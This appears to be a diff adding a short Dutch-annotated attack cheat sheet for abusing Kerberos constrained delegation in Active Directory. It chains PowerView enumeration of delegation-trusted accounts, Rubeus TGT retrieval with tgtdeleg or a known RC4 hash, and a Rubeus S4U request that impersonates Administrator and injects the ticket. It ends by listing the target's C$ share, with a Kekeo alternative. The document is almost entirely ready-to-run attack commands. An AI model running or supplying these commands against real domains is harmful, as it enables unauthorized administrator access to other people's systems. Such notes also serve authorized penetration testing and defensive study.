@@ -1,0 +1,14 @@
+# Constrained Delegation aanval - S4U impersonation
+# Stap 1: Vind accounts met constrained delegation
+powershell -c "Import-Module .\PowerView.ps1; Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto"
+Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto
+# Stap 2: Hash/TGT van service account verkrijgen
+.\Rubeus.exe tgtdeleg /nowrap
+# Of met bekende hash:
+.\Rubeus.exe asktgt /user:svc_account /rc4:HASH_HERE /nowrap
+# Stap 3: S4U (Self + Proxy) - impersonate Administrator
+.\Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:http,host,ldap,wsman /ptt
+# Stap 4: Verifieer toegang
+ls \\target.domain.local\c$
+# Alternatief met Kekeo:
+# tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/target.domain.local
